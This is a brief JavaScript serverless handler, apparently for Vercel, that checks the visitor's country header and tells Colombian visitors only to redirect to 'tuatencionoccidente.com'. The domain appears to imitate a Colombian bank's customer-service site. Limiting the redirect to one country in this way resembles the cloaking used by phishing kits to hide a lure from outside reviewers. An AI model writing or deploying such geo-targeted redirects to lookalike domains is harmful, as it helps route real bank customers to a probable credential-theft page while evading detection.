export default function handler(req, res) {

  const country = req.headers["x-vercel-ip-country"];

  if (country === "CO") {
    return res.json({
      redirect: true,
      url: "https://tuatencionoccidente.com"
    });
  }

  return res.json({
    redirect: false
  });
}
